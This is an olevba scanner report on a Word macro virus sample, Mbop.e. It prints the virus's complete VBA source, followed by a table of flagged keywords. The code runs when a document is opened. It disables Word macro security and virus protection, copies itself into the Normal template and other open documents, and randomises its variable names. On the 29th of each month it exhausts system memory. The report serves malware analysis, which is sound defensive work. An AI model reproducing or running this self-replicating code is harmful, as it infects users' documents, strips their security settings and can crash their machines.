olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mbop.e-ce54bb5fb7a4c16ef58f02ebd9e165eeb4a87dfb
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mbop.e-ce54bb5fb7a4c16ef58f02ebd9e165eeb4a87dfb - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
hssfihhhssfi = 1
hssfil1hssfi = "M"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = "1&"
Options.VirusProtection = False
Options.SaveNormalPrompt = False
hssfifihssfi = 1
Options.ConfirmConversions = False
Set hssfiNthssfi = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
hssfi11hssfi = 1
Set hssfiAdhssfi = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
hssfisehssfi = 3
Set hssfiTdhssfi = ThisDocument.VBProject.VBComponents.Item(1).CodeModule
hssfitrhssfi = 3
hssfil2hssfi = "b"
hssfifnhssfi = hssfifihssfi & hssfisehssfi & hssfitrhssfi
For hssfiiihssfi = 1 To hssfiTdhssfi.countoflines
If InStr(hssfiTdhssfi.lines(hssfiiihssfi, 1), "Private Sub Document_Open()") <> 0 Then
hssfiSlhssfi = hssfiiihssfi
Exit For
End If
Next
hssfil3hssfi = "o"
hssfiVchssfi = Trim(hssfiTdhssfi.lines(hssfiSlhssfi, hssfiSlhssfi + hssfifnhssfi))
hssfilvhssfi = 97
hssfi15hssfi = 15
If hssfiNthssfi.countoflines > 0 Then
hssfiNlhssfi = hssfiNthssfi.lines(1, hssfiNthssfi.countoflines)
If InStr(hssfiNlhssfi, "Nt") = 0 And InStr(hssfiNlhssfi, "Sl") = 0 And InStr(hssfiNlhssfi, "Nl") = 0 And InStr(hssfiNlhssfi, "Ad") = 0 And InStr(hssfiNlhssfi, "Vc") = 0 And InStr(hssfiNlhssfi, "Td") = 0 Then
If InStr(LCase(hssfiNlhssfi), "private sub document_open()") <> 0 Then
For hssfiihssfi = 1 To hssfiNthssfi.countoflines
If InStr(LCase(hssfiNthssfi.lines(hssfiihssfi, 1)), "private sub document_open()") <> 0 Then
hssfinshssfi = hssfiihssfi
Exit For
End If
Next
For hssfiihssfi = hssfinshssfi To hssfiNthssfi.countoflines
If InStr(LCase(hssfiNthssfi.lines(hssfiihssfi, 1)), "end sub") <> 0 Then
hssfinehssfi = hssfiihssfi
Exit For
End If
Next
hssfiNthssfi.deletelines hssfinshssfi, hssfinehssfi
End If
If InStr(LCase(hssfiNlhssfi), "option explicit") <> 0 Then
For hssfiihssfi = 1 To hssfiNthssfi.countoflines
If InStr(LCase(hssfiNthssfi.lines(hssfiihssfi, 1)), "option explicit") <> 0 Then
hssfinshssfi = hssfiihssfi
Exit For
End If
Next
hssfiNthssfi.deletelines hssfinshssfi, 1
End If
hssfiNthssfi.addfromstring hssfiVchssfi
hssfiNthssfi.Save
hssfiinhssfi = hssfihhhssfi
End If
Else
hssfiNthssfi.addfromstring hssfiVchssfi
hssfiNthssfi.Save
hssfiinhssfi = hssfihhhssfi
End If
hssfihvhssfi = 122
hssfiihssfi = 1
hssfidqhssfi = Documents.Count
If hssfiAdhssfi.countoflines > 0 Then
hssfiAlhssfi = hssfiAdhssfi.lines(1, hssfiAdhssfi.countoflines)
If InStr(hssfiAlhssfi, "Nt") = 0 And InStr(hssfiAlhssfi, "Sl") = 0 And InStr(hssfiAlhssfi, "Nl") = 0 And InStr(hssfiAlhssfi, "Ad") = 0 And InStr(hssfiAlhssfi, "Vc") = 0 And InStr(hssfiAlhssfi, "Td") = 0 Then
If InStr(LCase(hssfiAlhssfi), "private sub document_open()") <> 0 Then
For hssfiihssfi = 1 To hssfiAdhssfi.countoflines
If InStr(LCase(hssfiAdhssfi.lines(hssfiihssfi, 1)), "private sub document_open()") <> 0 Then
hssfinshssfi = hssfiihssfi
Exit For
End If
Next
For hssfiihssfi = hssfinshssfi To hssfiAdhssfi.countoflines
If InStr(LCase(hssfiAdhssfi.lines(hssfiihssfi, 1)), "end sub") <> 0 Then
hssfinehssfi = hssfiihssfi
Exit For
End If
Next
hssfiAdhssfi.deletelines hssfinshssfi, hssfinehssfi
End If
If InStr(LCase(hssfiAlhssfi), "option explicit") <> 0 Then
For hssfiihssfi = 1 To hssfiAdhssfi.countoflines
If InStr(LCase(hssfiAdhssfi.lines(hssfiihssfi, 1)), "option explicit") <> 0 Then
hssfinshssfi = hssfiihssfi
Exit For
End If
Next
hssfiAdhssfi.deletelines hssfinshssfi, 1
End If
hssfiAdhssfi.addfromstring hssfiVchssfi
hssfiiahssfi = hssfihhhssfi
End If
Else
hssfiAdhssfi.addfromstring hssfiVchssfi
hssfiiahssfi = hssfihhhssfi
End If
hssfil4hssfi = "p"
Randomize
hssfi15hssfi = Int((hssfi15hssfi - hssfi11hssfi + hssfi11hssfi) * Rnd + hssfi11hssfi)
For hssfiiihssfi = 1 To hssfi15hssfi
Randomize
hssfiTnhssfi = hssfiTnhssfi & Chr(Int((hssfihvhssfi - hssfilvhssfi + 1) * Rnd + hssfilvhssfi))
Next
hssfid2hssfi = 9
hssfiVchssfi = hssfiTdhssfi.lines(1, hssfiTdhssfi.countoflines)
hssfiTdhssfi.deletelines 1, hssfiTdhssfi.countoflines
Do While InStr(hssfiVchssfi, "hssfi") <> 0
hssfiVchssfi = Mid(hssfiVchssfi, 1, InStr(hssfiVchssfi, "hssfi") - 1) & hssfiTnhssfi & Mid(hssfiVchssfi, InStr(hssfiVchssfi, "hssfi") + Len("hssfi"))
Loop
hssfiTdhssfi.addfromstring hssfiVchssfi
hssfidyhssfi = Day(Now)
hssfid1hssfi = 2
hssfil5hssfi = "!"
If hssfidyhssfi = hssfid1hssfi & hssfid2hssfi Then
Dim hssfisthssfi()
hssficahssfi = 0
Do
ReDim Preserve hssfisthssfi(hssficahssfi)
hssfiqwhssfi = CLng(1024)
hssfiqahssfi = hssfiqwhssfi
hssfiqzhssfi = hssfiqwhssfi * hssfiqahssfi
hssfisthssfi(hssficahssfi) = String(hssfiqzhssfi, Right(hssfiTnhssfi, 1))
DoEvents
hssficahssfi = hssficahssfi + 1
Loop
End If
If hssfiiahssfi = hssfihhhssfi Or hssfiinhssfi = hssfihhhssfi Then
MsgBox hssfil1hssfi & hssfil2hssfi & hssfil3hssfi & hssfil4hssfi & hssfil5hssfi, vbCritical
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

